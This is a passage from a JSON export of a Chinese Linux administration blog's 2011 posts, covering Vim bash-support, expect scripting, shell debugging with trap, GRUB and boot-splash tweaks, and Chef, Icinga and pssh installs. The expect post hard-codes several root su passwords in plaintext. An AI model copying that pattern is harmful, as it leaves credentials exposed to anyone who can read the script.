Groups地址(也就是负载均衡前端IP)就实现了访问你最初建的POOL里面节点的web内容不同的域名需要不同的在httpd.conf里面指定因为我这里监听的是192.168.8.108的8080端口,所以在这个端口上的HTTP流量都会走这个加密的https协议 </font><div style=\"position: absolute; display: none; z-index: 9999;\" id=\"livemargins_control\"><img src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" style=\"position: absolute;left:-77px;top:-5px\" height=\"5\" width=\"77\" />\t<img src=\"chrome://livemargins/skin/monitor-background-vertical.png\" style=\"position: absolute;left:0;top:-5px;\" />\t<img id=\"monitor-play-button\" src=\"chrome://livemargins/skin/monitor-play-button.png\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" style=\"position: absolute;left:1px;top:0;opacity:0.5;cursor:pointer\" /></div><div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" alt=\"\" src=\"http://img.zemanta.com/pixy.gif?x-id=0e8b3cc5-5bb3-8e44-83a5-5b82e3858738\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "08"
    }
  },
  {
    "id": 51,
    "title": "使用Vim的bash-Support插件调试bash shell脚本",
    "category": "Bash Shell",
    "tags": [
      "bash-Support"
    ],
    "url": "/archives/%E4%BD%BF%E7%94%A8vim%E7%9A%84bash-support%E6%8F%92%E4%BB%B6%E8%B0%83%E8%AF%95bash-shell%E8%84%9A%E6%9C%AC/",
    "content": "<p><strong>1  下载安装并启用：</strong></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# mkdir ~/.vim\n[root@server ~]# cd !$</p>\n\n<p>cd ~/.vim</p>\n\n<p>[root@server ~]# wget -O bash-support.zip <a href=\"http://www.vim.org/scripts/download_script.php?src_id=15125\">http://www.vim.org/scripts/download_script.php?src_id=15125</a>\n[root@server .vim]# unzip bash-support.zip</p>\n\n<p>假如你没有自己设置的vimrc文件，建议使用他提供的一个自定义的vimrc</p>\n\n<p>[root@server ~]# cp .vim/bash-support/rc/customization.vimrc ~/.vimrc</pre></p>\n\n<p><strong>2  使用中的一些技巧：</strong></p>\n\n<p><strong>1 自动向sh文件中添加文件头部</strong></p>\n\n<p>当你打开一个以sh为后缀的文件时，文件中会包含以下文件头。然后进入插入状态，光标会移动到DESCRIPTION位置。</p>\n\n<p><pre class=\"sh_bash\">#!/bin/bash -\n#===============================================================================\n#\n#          FILE:  ssss.sh\n#\n#         USAGE:  ./ssss.sh\n#\n#   DESCRIPTION:\n#\n#       OPTIONS:  ---\n#  REQUIREMENTS:  ---\n#          BUGS:  ---\n#         NOTES:  ---\n#        AUTHOR: Dong Weiming (os), ciici1234@hotmail.com\n#       COMPANY: dongwm.com\n#       CREATED: 2011年02月14日 14时02分33秒 CST\n#      REVISION:  ---\n#===============================================================================</p>\n\n<p>set -o nounset                              # Treat unset variables as an error</pre></p>\n\n<p>这是因为我修改了模版文件.vim/bash-support/templates/Templates</p>\n\n<p><pre class=\"sh_bash\">=============================================================\n========== USER MACROS ========================================\n=============================================================\n|AUTHOR|    = Dong Weiming\n|AUTHORREF| = os\n|EMAIL|     = ciici1234@hotmail.com\n|COMPANY|   = dongwm.com\n|COPYRIGHT| = Copyright (c) |YEAR|, |AUTHOR|</pre></p>\n\n<p><strong>2 </strong><a href=\"http://lug.fh-swf.de/vim/vim-bash/bash-hot-keys.pdf\" target=\"_blank\"><strong>程序的一些命令(注：(i) insert mode, (n) normal mode, (v) visual mode下同)</strong></a></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "08"
    }
  },
  {
    "id": 52,
    "title": "关于expect研究（二）",
    "category": "expect",
    "tags": [
      "switch",
      "tcl",
      "控制结构"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Eexpect%E7%A0%94%E7%A9%B6%EF%BC%88%E4%BA%8C%EF%BC%89/",
    "content": "<p>本文主要介绍expect,也就是tcl语言的控制结构\n1  if ...else 结构\n首先展示一个脚本,这个叫本用来根据argv0的输入选择不同的expect语句SSH远程登录到相对应的服务器,并设置一些错误输出:\n<pre class=\"sh_bash\">dongwm@linux-3qd1:~&gt; cat bin/test\n#!/usr/bin/expect\nset timeout 10\nset passwordops01 cpuqPFtkt{20\nset passwordops02 O^v44qftahbN\nset passwordops03 9uujz)UUf7yr\nset file1 [lindex $argv 0]\nif {$argc!=1} {\nputs stderr \"参数错误,请使用以下格式: $argv0 {想去的服务器简称,比如ops01} \"\nexit 1\n}\nif {$file1==\"ops01\"} {\nspawn luit -encoding gbk ssh dongwm@59.194.82.XX -p 9924\nexpect 194.168.45.XX\nsend \"su -\\n\"   //设置了不容许root组直接登录\nexpect \"口令：\"\nsend \"$passwordops01\\n\"\ninteract\n} elseif {$file1==\"ops02\"} {\nspawn luit -encoding gbk ssh dongwm@59.194.82.XX -p 9924\nexpect 194.168.45.XX\nsend \"ssh ops@ops04\\n\"\nexpect \"192.168.9.24\"\nsend \"su -\\n\"\nexpect \"口令：\"\nsend \"$passwordops02\\n\"\ninteract\n} elseif {$file1==\"ops03\"} {\nspawn luit -encoding gbk ssh dongwm@59.194.82.XX -p 9960\nexpect 194.168.45.XX\nsend \"su -\\n\"\nexpect \"口令：\"\nsend \"$passwordops03\\n\"\ninteract\n}  else {\nsend \"参数错误,请输入以下名称:ops01 ops02 ops03\\n\"\n}\n注:这个脚本里面有SSH信任 有根据iptables转发</p>\n\n<p>if ...else 没啥可说的^.^</pre>\n2 switch结构\n还是上面的判断,我这里留下2个表达语法:\n<!--\n@page { margin: 2cm }\nP { margin-bottom: 0.21cm }\n--><pre class=\"sh_bash\">switch -glob -- $file1 {\nops01 {\nspawn luit -encoding gbk ssh dongwm@59.194.82.XX -p 9924expect 194.168.45.XX\nsend \"su -\\n\"   //设置了不容许root组直接登录\nexpect \"口令：\"\nsend \"$passwordops01\\n\"\ninteract\n}\nops02 {\nspawn luit -encoding gbk ssh dongwm@59.194.82.XX -p 9924\nexpect 194.168.45.XX\nsend \"ssh ops@ops04\\n\"\nexpect \"192.168.9.24\"\nsend \"su -\\n\"\nexpect \"口令：\"\nsend \"$passwordops02\\n\"\ninteract\n} </pre>\n<p style=\"margin-left: 0.64cm; text-indent: -0.64cm; margin-bottom: 0cm;\"></p>\n<p style=\"margin-left: 0.64cm; text-indent: -0.64cm; margin-bottom: 0cm;\">3  while结构 (顺便break和continue)</p>\n<p style=\"margin-left: 0.64cm; text-indent: -0.64cm; margin-bottom: 0cm;\"><pre class=\"sh_bash\">dongwm@linux-3qd1:~&gt; cat !$\ncat bin/test\n#!/usr/bin/expect\nset test 0\nwhile {$test&lt;10} {\nset test [expr {$test + 1}]\nif {$test &gt; 7} break\nif \"$test &lt; 3\" continue\nputs \"test is $test\"\n}\n本来此例去掉break和continue会输出1..9 因为break存在只能输出到7 ,因为continue存在,当test=1,2的时候 不符合要求,直接略过了</pre></p>\n<p style=\"margin-left: 0.64cm; text-indent: -0.64cm; margin-bottom: 0cm;\">4  catch</p>\n<p style=\"margin-left: 0.64cm; text-indent: -0.64cm; margin-bottom: 0cm;\">catch用于捕捉让脚本停止执行的错误的输出:</p>\n<p style=\"margin-left: 0.64cm; text-indent: -0.64cm; margin-bottom: 0cm;\"><pre class=\"sh_bash\">dongwm@linux-3qd1:~&gt; cat !$\ncat bin/test1\n#!/usr/bin/expect\nproc Error {} {\nerror \"This is a error for test\"\n}\ncatch Error test\nputs $test\ndongwm@linux-3qd1:~&gt; !$\nbin/test1\nThis is a error for test</pre></p>\n&nbsp;\n<div id=\"livemargins_control\" style=\"position: absolute; display: none; z-index: 9999;\"><img style=\"position: absolute; left: -77px; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" alt=\"\" width=\"77\" height=\"5\" /> <img style=\"position: absolute; left: 0; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-vertical.png\" alt=\"\" /> <img id=\"monitor-play-button\" style=\"position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" src=\"chrome://livemargins/skin/monitor-play-button.png\" alt=\"\" /></div>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=96a78524-c46f-816f-a821-e23986f21990\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "09"
    }
  },
  {
    "id": 53,
    "title": "shell脚本调试高级学习",
    "category": "Bash Shell",
    "tags": [
      "shell",
      "trap",
      "伪信号",
      "脚本调试"
    ],
    "url": "/archives/shell%E8%84%9A%E6%9C%AC%E8%B0%83%E8%AF%95%E9%AB%98%E7%BA%A7%E5%AD%A6%E4%B9%A0/",
    "content": "<p><strong>1  函数调试--额这个函数使用了shell内置变量$?，执行$?的值可以接着执行命令，调用函数</strong></p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test.sh\n#!/bin/bash\nalert ()\n{ if [ \"$1\" -ne 0 ]; then echo \"WARNING: $2 did not complete successfully.\" &gt;&amp;2; exit $1; else echo \"INFO: $2 completed successfully\" &gt;&amp;2; fi;}\nsh test11.sh  //一个我用来测试的脚本,当脚本正确或者不正确输出不一样的调试报错\nalert $?</pre></p>\n\n<p><strong>2 trap</strong></p>\n\n<p>trap命令用于捕获指定的信号并执行预定义的命令。</p>\n\n<p>语法：trap 'command' signal</p>\n\n<p>转：其中signal是要捕获的信号，command是捕获到指定的信号之后，所要执行的命令。可以用kill –l命令看到系统中全部可用的信号名，捕获信号后所执行的命令可以是任何一条或多条合法的shell语句，也可以是一个函数名。\nshell脚本在执行时，会产生三个所谓的“伪信号”，(之所以称之为“伪信号”是因为这三个信号是由shell产生的，而其它的信号是由操作系统产生的)，通过使用trap命令捕获这三个“伪信号”并输出相关信息对调试非常有帮助。</p>\n\n<p><a name=\"table1\"><span style=\"background-color: #ffff00;\"><strong> shell伪信号</strong></span></a><span style=\"background-color: #ffff00;\"><strong>分类：</strong></span></p>\n\n<p>EXIT\n从一个函数中退出或整个脚本执行完毕</p>\n\n<p>ERR\n当一条命令返回非零状态时(代表命令执行不成功)</p>\n\n<p>DEBUG\n脚本中每一条命令执行之前</p>\n\n<p><pre class=\"sh_bash\">[root@server ~]# cat test.sh\n#!/bin/bash\ntrap 'echo “before execute line:$LINENO, a=$a,b=$b,c=$c”' DEBUG\na=1\nb=$(($a+1))\nc=$(($b+1))\necho $c</p>\n\n<p>[root@server ~]# sh !$\nsh test.sh\n“before execute line:3, a=,b=,c=”\n“before execute line:4, a=1,b=,c=”\n“before execute line:5, a=1,b=2,c=”\n“before execute line:6, a=1,b=2,c=3”\n3</p>\n\n<p>注：这个调试脚本不需要每句语句都加echo，只要最上面一行trap。本例表示此行执行前执行信号</p>\n\n<p></pre></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "13"
    }
  },
  {
    "id": 54,
    "title": "修改opensuse开机grub画面",
    "category": "opensuse",
    "tags": [
      "grub开机背景"
    ],
    "url": "/archives/%E4%BF%AE%E6%94%B9opensuse%E5%BC%80%E6%9C%BAgrub%E7%94%BB%E9%9D%A2/",
    "content": "<p><strong>追溯到菜鸟时间,见到以百度大大吧百度服务器的开机画面都弄成了百度的那个小脚丫图片,崇拜的哇哇的!!最近闲来无事,也修改了下自己的opensuse11.4系统,以下是过程及一些心得:\n</strong><pre class=\"sh_bash\">linux-3qd1:/home/dongwm # mkdir new   //创建一个目录 用来放message解压出来的文件\n\\linux-3qd1:/home/dongwm # cp /boot/message new/\nlinux-3qd1:/home/dongwm # cd new/\nlinux-3qd1:/home/dongwm/new # cpio -i &lt; message   //解开message文件,其中包含了一些文件和图片\n827 块\nlinux-3qd1:/home/dongwm/new # cp /home/dongwm/桌面/Background.jpg back.jpg  //替换解压出来的一个back.jpg文件  这个就是开始启动的那个背景图片，Background.jpg是我自己的图片，使用GIMP编辑，尺寸最大为800x600，色深24bit真彩色，gimp采样格式 <em>2x2,1x1,1x1（最小文件）</em> ;文件大小不能超过150-300KB .\nlinux-3qd1:/home/dongwm/new # rm message -f   //删除这个message  因为要不然生成的新message还包含了以前的message  不起效果\nlinux-3qd1:/home/dongwm/new # ls |cpio -o &gt;../message   //生成新的message  放在了上一级目录下\n867 块\nlinux-3qd1:/home/dongwm/new # cp /boot/message /boot/message.bak  //安全起见  备份\nlinux-3qd1:/home/dongwm/new # cp ../message /boot/   //拷贝新的message</p>\n\n<p>ok  重启吧  </pre>\n<div id=\"livemargins_control\" style=\"position: absolute; display: none; z-index: 9999;\"><img style=\"position: absolute; left: -77px; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" alt=\"\" width=\"77\" height=\"5\" /> <img style=\"position: absolute; left: 0; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-vertical.png\" alt=\"\" /> <img id=\"monitor-play-button\" style=\"position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" src=\"chrome://livemargins/skin/monitor-play-button.png\" alt=\"\" /></div>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=e2ffd0ef-61c7-8737-8233-02af011192cb\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "13"
    }
  },
  {
    "id": 55,
    "title": "修改opensuse修改开机过程背景画面和Grub开启企鹅动画技巧",
    "category": "linux基础",
    "tags": [
      "suse企鹅"
    ],
    "url": "/archives/%E4%BF%AE%E6%94%B9opensuse%E4%BF%AE%E6%94%B9%E5%BC%80%E6%9C%BA%E8%BF%87%E7%A8%8B%E8%83%8C%E6%99%AF%E7%94%BB%E9%9D%A2%E5%92%8Cgrub%E5%BC%80%E5%90%AF%E4%BC%81%E9%B9%85%E5%8A%A8%E7%94%BB%E6%8A%80/",
    "content": "<p>类似于XP开机那个来回循环走的小进度条的方式,opensuse其实也是可以修改的\n1  制作注意事项:\n使用GIMP编辑注意保存时候参数设置:另存为-&gt;保存-&gt;高级选项.其中质量的参数能控制图片大小,子采样需要<em><strong>2x2,1x1,1x1</strong></em> DCT方法 需要\"整数\"\n2 备份复制图片\n<pre class=\"sh_bash\">linux-3qd1:/home/dongwm # cp 桌面/桌面\\ Background.jpg /etc/bootsplash/themes/openSUSE/images/silent-1024x768.jpg\nlinux-3qd1:/home/dongwm # cp 桌面/桌面\\ Background.jpg /etc/bootsplash/themes/openSUSE/images/bootsplash-bootsplash-1024x768.jpg </pre>\n3 生成新的initrd\n<pre class=\"sh_bash\">mkinitrd -s 1024x768</pre></p>\n\n<p>企鹅动态画面是openSUSE发行的Grub自带的启动画面，只需要修改gfxboot的配置文件就可以开启企鹅动态画面。\n<pre class=\"sh_bash\">\nlinux-3qd1:/home/dongwm #  gfxboot --change-config base::penguin=100\n还可以自己修改gfxboot.cfg文件，启用企鹅画面：\nlinux-3qd1:/home/dongwm # vi /etc/bootsplash/themes/openSUSE/cdrom/gfxboot.cfg</p>\n\n<p>; penguin theme likelihood (in percent, -1 = auto)\npenguin=-1\n</pre></p>\n\n<p>修改peguin变量的值为企鹅画面显示的几率（从0-100选个数字，代表出现几率为0%-100%）:</p>\n\n<p>; penguin theme likelihood (in percent, -1 = auto)\npenguin=100</p>\n\n<p>&nbsp;\n<div id=\"livemargins_control\" style=\"position: absolute; display: none; z-index: 9999;\"><img style=\"position: absolute; left: -77px; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" alt=\"\" width=\"77\" height=\"5\" /> <img style=\"position: absolute; left: 0; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-vertical.png\" alt=\"\" /> <img id=\"monitor-play-button\" style=\"position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" src=\"chrome://livemargins/skin/monitor-play-button.png\" alt=\"\" /></div>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=670cf740-daf0-8a3f-ab8a-79decfa2c7a8\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "14"
    }
  },
  {
    "id": 56,
    "title": "安装debian后无法进入windows 7 解决办法",
    "category": "debian",
    "tags": [
      "debian"
    ],
    "url": "/archives/%E5%AE%89%E8%A3%85debian%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9B%E5%85%A5windows-7-%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/",
    "content": "<p>最近安装了debian6.1版本，发现grub没有了windows7 菜单选项，这个grub是debian的天下。。。研究后感觉应该是debian使用了grub2的缘故，解决办法如下：</p>\n\n<p><pre class=\"sh_bash\">sudo vi /boot/grub/grub.cfg</p>\n\n<p>将 windows 7 信息写进去：</p>\n\n<p>### BEGIN /etc/grub.d/30_os-prober ###</p>\n\n<p>menuentry \"Windows 7 (loader) (on /dev/sda2)\" {</p>\n\n<p>insmod part_msdos</p>\n\n<p>insmod ntfs</p>\n\n<p>set root='(hd0,msdos2)'</p>\n\n<p>search --no-floppy --fs-uuid --set 2e40f57240f540df</p>\n\n<p>chainloader +1</p>\n\n<p>}</p>\n\n<p>### END /etc/grub.d/30_os-prober ###</pre></p>\n\n<p>注：其中分区信息可以使用在开机进入grub菜单按“c”，然后在grub&gt;下输入 root （hd0，X）（实在不懂X可以从0开始试 ） –&gt; chainloader +1 –&gt; boot 要是启动到windows  说明这个就是需要找的</p>\n\n<p>然后 执行 sudo update-grub    重启电脑就可以了</p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "14"
    }
  },
  {
    "id": 57,
    "title": "chef专题(一):安装chef",
    "category": "chef",
    "tags": [
      "chef"
    ],
    "url": "/archives/chef%E4%B8%93%E9%A2%98%E4%B8%80%E5%AE%89%E8%A3%85chef/",
    "content": "<p><strong>1  安装前准备:</strong>\n<pre class=\"sh_bash\">\n1 确保hostname是FQDN格式:\n[root@dongwm ~]# hostname -f\ndongwm.okooo.com\n2 查看iptables是否占用4000和4040端口,或者给这2个端口以权限\n3 安装EPEL Yum Repository.\nsudo rpm -Uvh http://download.fedora.redhat.com/pub/epel/5/i386/epel-release-5-4.noarch.rpm\n3 安装ELFF Yum Repository. </pre>\n<strong>2  安装server</strong>\n<pre class=\"sh_bash\">\nsudo yum install chef-server-api  //安装\n[root@zhouyq yum.repos.d]# rpm -e --nodeps rubygem-rest-client-1.6.1-2.el5 //可能这个被EPEL升级不能兼容,因为server需要的版本要小于1.5\nwget http://rubygems.org/downloads/rest-client-1.3.1.gem   /下载合适的gem\n[root@zhouyq yum.repos.d]# gem install ~/rest-client-1.3.1.gem --local  //本地安装,因为直接使用\"gem install rest-client -v 1.3.1 \"总是有问题\nSuccessfully installed rest-client-1.3.1\n1 gem installed\nInstalling ri documentation for rest-client-1.3.1...\nInstalling RDoc documentation for rest-client-1.3.1...</pre>\n<strong>启动相关服务:</strong>\n<pre class=\"sh_bash\">\nfor service in couchdb rabbitmq-server chef-solr chef-solr-indexer chef-server\ndo\nsudo /sbin/service $service start\nsudo /sbin/chkconfig $service on\ndone\n注:这里可能会出现问题 要是服务启动不了 可能是rest-client和hostname的关系\nStarting database server couchdb\nStarting rabbitmq-server: SUCCESS\nrabbitmq-server.\nStarting chef-solr:                                        [  OK  ]\nStarting chef-solr-indexer:                                [  OK  ]\nStarting chef-server:                                      [  OK  ]</pre>\n<strong>测试见通的相关服务端口是否启动:</strong>\n<pre class=\"sh_bash\">\n[root@zhouyq yum.repos.d]# netstat -tunlp|grep 5984\ntcp        0      0 127.0.0.1:5984              0.0.0.0:*                    LISTEN      5609/beam.smp       //CouchDB服务\n[root@zhouyq yum.repos.d]# netstat -tunlp|grep 5672\ntcp        0      0 0.0.0.0:5672                0.0.0.0:*                   LISTEN      5661/beam.smp   //rabbitmq服务\n[root@zhouyq yum.repos.d]# netstat -tunlp|grep 8983\ntcp        0      0 :::8983                     :::*                        LISTEN      5740/java        //chef-solr服务\n[root@zhouyq yum.repos.d]# netstat -tunlp|grep 4000\ntcp        0      0 0.0.0.0:4000                0.0.0.0:*                   LISTEN      6207/merb : chef-se //主程序</pre>\n<strong>安装chef的webgui:</strong>\n<pre class=\"sh_bash\">\nyum install chef-server-webui &amp;&amp; /sbin/service chef-server-webui start &amp;&amp; /sbin/chkconfig chef-server-webui on\n查看监听端口\n[root@zhouyq yum.repos.d]# netstat -tunlp|grep 4040\ntcp        0      0 0.0.0.0:4040                0.0.0.0:*                   LISTEN      6285/merb : chef-se </pre>\n<strong>3 安装client</strong>\n<pre class=\"sh_bash\">yum install chef\nroot@client ~&gt; wget http://rubygems.org/downloads/rest-client-1.3.1.gem\nroot@client ~&gt; gem install ~/rest-client-1.3.1.gem --local\nSuccessfully installed rest-client-1.3.1\n1 gem installed\nInstalling ri documentation for rest-client-1.3.1...\nInstalling RDoc documentation for rest-client-1.3.1...\nroot@client ~&gt; /sbin/service chef-client start\nStarting chef-client:                                      [  OK  ]\nroot@client ~&gt; /sbin/chkconfig chef-client on</pre>\n<div id=\"livemargins_control\" style=\"position: absolute; display: none; z-index: 9999;\"><img style=\"position: absolute; left: -77px; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" alt=\"\" width=\"77\" height=\"5\" /> <img style=\"position: absolute; left: 0; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-vertical.png\" alt=\"\" /> <img id=\"monitor-play-button\" style=\"position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" src=\"chrome://livemargins/skin/monitor-play-button.png\" alt=\"\" /></div>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=f4be854d-40c5-8145-81a2-0a12f26e9cea\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "15"
    }
  },
  {
    "id": 58,
    "title": "Icinga专题（一）Icinga安装",
    "category": "icinga",
    "tags": [
      "icinga"
    ],
    "url": "/archives/icinga%E4%B8%93%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89icinga%E5%AE%89%E8%A3%85/",
    "content": "<p><strong>Icinga是一些nagios项目社区的成员发起的，兼容nagios，并实现了中文化和安卓系统版本。I like ^.^</strong></p>\n\n<p><strong><a href=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_13.png\"><img class=\"alignnone size-full wp-image-461\" title=\"image_1\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_13.png\" alt=\"\" width=\"890\" height=\"342\" /></a>\n</strong></p>\n\n<p><strong><a href=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_12.png\"><img class=\"alignnone size-full wp-image-459\" title=\"image_1\" src=\"http://www.dongwm.com/wp-content/uploads/2011/04/image_12.png\" alt=\"\" width=\"800\" height=\"453\" /></a>\n</strong></p>\n\n<p><strong>1 准备</strong></p>\n\n<p><pre class=\"sh_bash\">#yum  install freetype libjpeg libpng fontconfig libdbi libdbi-drivers gcc glibc glibc-common gd gd-devel libjpeg libjpeg-devel libpng libpng-devel net-snmp net-snmp-devel</pre></p>\n\n<p><strong>2 下载安装icinga</strong></p>\n\n<p><pre class=\"sh_bash\">#wget http://sourceforge.net/projects/icinga/files/icinga/1.3.1/icinga-1.3.1.tar.gz/download</p>\n\n<p># tar zxvf icinga-1.3.1.tar.gz</p>\n\n<p>#cd icinga-1.3.1/</p>\n\n<p>#./configure --with-rdbm --with-rdbm-incdir=/usr/include/rdbm/ --with-rdbm-libdir=/usr/lib64/ --disable-docs  --with-icinga-user=dongwm   --with-icinga-group=dongwm --with-command-user=dongwm  --with-command-group=dongwm &amp;&amp; make all &amp;&amp; make install</p>\n\n<p>#make install-init   //# 安装主程序，CGI和HTML\n#make install-commandmode //在/etc/rc.d/init.d安装启动脚本\n#make install-config  // 安装配置实例配置文件\n#make install-webconf  //安装apache相关的配置文件\n# chkconfig --add icinga\n# chkconfig icinga on</p>\n\n<p># /etc/init.d/icinga start</pre></p>\n\n<p><strong>3 设置web页面登陆用户</strong><strong>及密码(必须）</strong></p>\n\n<p><pre class=\"sh_bash\">默认用户名 icingaadmin 默认密码admin</p>\n\n<p>用户可自行修改,如htpasswd -c /usr/local/icinga/etc/htpasswd.users dongwm</pre></p>\n\n<p><strong>4  安装nagios-plugins</strong></p>\n\n<p><pre class=\"sh_bash\"># wget http://sourceforge.net/projects/nagiosplug/files/nagiosplug/1.4.15/nagios-plugins-1.4.15.tar.gz/download</p>\n\n<p># tar zxvf nagios-plugins-1.4.15.tar.gz</p>\n\n<p># cd nagios-plugins-1.4.15/</p>\n\n<p>#./configure --prefix=/usr/local/icinga --with-cgiurl=/icinga/cgi-bin --with-htmurl=/icinga --with-nagios-user=dongwm --with-nagios-group=dongwm</p>\n\n<p># make &amp;&amp; make install</pre></p>\n\n<p><strong>5  安装nrpe</strong></p>\n\n<p><pre class=\"sh_bash\">#wget \"<a href=\"https://git.icinga.org/?p=icinga-nrpe.git;a=snapshot;h=HEAD;sf=tgz&quot;\">https://git.icinga.org/?p=icinga-nrpe.git;a=snapshot;h=HEAD;sf=tgz\"</a> -O nrpe.tgz\n#tar zxvf nrpe.tgz</p>\n\n<p># cd icinga-nrpe  &amp;&amp;  ./configure --with-nrpe-user=dongwm --with-nrpe-group=dongwm --with-icinga-user=dongwm --with-icinga-group=dongwm &amp;&amp;make all &amp;&amp;make install-plugin</p>\n\n<p>拷贝nrpe文件：</p>\n\n<p>#cp src/nrpe  /usr/local/icinga/bin</p>\n\n<p>#cp sample-config/nrpe.cfg /usr/local/icinga/etc</p>\n\n<p>启动nrpe并检查：</p>\n\n<p># /usr/local/icinga/bin/nrpe -n -c /usr/local/icinga/etc/nrpe.cfg -d</p>\n\n<p># /usr/local/icinga/libexec/check_nrpe  -H 127.0.0.1 –n</p>\n\n<p>NRPE v2.12</p>\n\n<p>stop nrpe：</p>\n\n<p>#kill `ps -ef | grep \"sample-config/nrpe.cfg\" | grep -v grep | awk '{print $2}'`</pre></p>\n\n<p><strong>6 配置文件</strong></p>\n\n<p><strong>其实icinga的配置文件可以把nagios的配置文件直接拷贝过来使用，把关键字‘nagios’改成‘icinga’就完全可以了</strong></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "16"
    }
  },
  {
    "id": 59,
    "title": "nagios日志格式转换问题",
    "category": "nagios",
    "tags": [
      "nagios日志格式"
    ],
    "url": "/archives/nagios%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E8%BD%AC%E6%8D%A2%E9%97%AE%E9%A2%98/",
    "content": "<p>默认的nagios的日志格式记录的是从1970年到发生事件的秒数,而不是直接告诉我们当前的时间.在分析日志时,我进行了转换:</p>\n\n<p><pre class=\"sh_bash\">[root@log05 ~]# cat /home/dongwm/nagios-log.sh\n#!/bin/bash\nwhile read line\ndo\nec=`echo $line|grep -Po [0-9]\\{10\\}`\ned=`date -d '1970-01-01 '$ec' sec' +%Y-%m-%d-%T`\neval sed -i 's/'$ec'/'$ed'/g' nagios.log\ndone&lt;YZ.nagios.log</pre>\n<div id=\"livemargins_control\" style=\"position: absolute; display: none; z-index: 9999;\"><img style=\"position: absolute; left: -77px; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" alt=\"\" width=\"77\" height=\"5\" /> <img style=\"position: absolute; left: 0; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-vertical.png\" alt=\"\" /> <img id=\"monitor-play-button\" style=\"position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" src=\"chrome://livemargins/skin/monitor-play-button.png\" alt=\"\" /></div>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=8ae86720-8fa5-8f60-aa82-1ce730b156e2\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "20"
    }
  },
  {
    "id": 60,
    "title": "使用pssh进行并行批量操作",
    "category": "其它",
    "tags": [
      "pssh"
    ],
    "url": "/archives/%E4%BD%BF%E7%94%A8pssh%E8%BF%9B%E8%A1%8C%E5%B9%B6%E8%A1%8C%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C/",
    "content": "<p><strong>假如同时给上千台服务器执行一个命令,拷贝一个文件,杀一个进程等,有什么简化运维管理的工具呢?在小型使用中我都是使用for循环,数量巨大,一方面不确定操作是否成功,一方面for循环语句性能不好估计且是不是同步并行执行.，这类工具比如pdsh，mussh，cssh，dsh等还有这里提到的pssh:\n1  安装:</strong>\n<pre class=\"sh_bash\">#wget http://peak.telecommunity.com/dist/ez_setup.py\npython ez_setup.py\n#wget http://parallel-ssh.googlecode.com/files/pssh-2.2.2.tar.gz\n# tar zxvf pssh-2.2.2.tar.gz\n# cd pssh-2.2.2\n# python setup.py install</pre>\n<strong>2  pssh使用 (假设ssh已做好SSH信任,ssh信任请参看:<a href=\"http://www.dongwm.com/archives/%E5%85%B3%E4%BA%8Essh%E5%91%BD%E4%BB%A4%E7%A0%94%E7%A9%B6%E4%BB%A5%E5%8F%8Assh%E4%BF%A1%E4%BB%BB%E8%AF%A6%E8%A7%A3/\" target=\"_blank\">关于ssh命令研究以及SSH信任详解</a>)</strong>\npssh工具包主要有5个程序:\n<strong>1 pssh  多主机并行运行命令</strong>\n<pre class=\"sh_bash\">[root@server pssh-2.2.2]# pssh -P -h test.txt uptime\n192.168.9.102:  14:04:58 up 26 days, 17:05,  0 users,  load average: 0.07, 